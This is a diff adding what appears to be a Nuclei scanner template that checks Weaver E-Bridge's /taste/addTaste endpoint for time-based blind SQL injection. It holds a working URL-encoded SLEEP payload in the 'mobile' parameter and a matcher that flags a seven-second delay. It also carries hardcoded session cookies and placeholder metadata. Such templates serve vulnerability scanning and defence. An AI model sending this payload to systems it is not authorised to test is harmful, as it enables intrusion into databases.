@@ -1,0 +1,27 @@
+id: weaver-e-bridge-mobile-sqli
+
+info:
+  name: weaver-e-bridge-mobile-sqli
+  author: apple
+  severity: info
+  description: description
+  reference:
+    - https://mp.weixin.qq.com/s/onjZUKgLkvl0m_e2D_m4BQ
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        GET /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(7-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Cookie: EBRIDGE_JSESSIONID=CAE1276AE2279FD98B96C54DE624CD18; sl-session=BmCjG8ZweGWzoSGpQ1QgQg==; EBRIDGE_JSESSIONID=21D2D790531AD7941D060B411FABDC10
+        Accept-Encoding: gzip
+        SL-CE-SUID: 25
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=7'
+          - 'status_code == 200'
+        condition: and
